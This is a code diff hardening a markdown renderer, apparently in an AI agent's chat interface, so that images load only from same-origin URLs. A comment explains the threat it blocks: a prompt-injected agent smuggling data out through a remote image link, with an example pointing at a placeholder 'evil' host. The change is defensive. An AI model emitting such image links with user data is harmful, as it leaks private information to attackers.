@@ -106,7 +106,11 @@ renderer.link = function (token) {
 };
 renderer.image = function (token) {
   // token.text is the alt text, already escaped by the tokenizer — returned as-is on refusal.
-  return safeHref(token.href) ? Renderer.prototype.image.call(this, token) : (token.text || '');
+  // Same-origin only: an <img> loads with no click, so a remote src is an egress channel a
+  // prompt-injected agent can stuff data into (`![x](https://evil/?d=…)`). safeHref already
+  // refuses protocol-relative and odd schemes; this also refuses any scheme at all.
+  const h = String(token.href ?? '').trim();
+  return safeHref(h) && !/^[a-z][a-z0-9+.-]*:/i.test(h) ? Renderer.prototype.image.call(this, token) : (token.text || '');
 };
 // The agent's memory write-back is a ```mows-memory fence at the end of most replies, and it
 // was most of every message on screen — the same text the Memory card already shows. It is
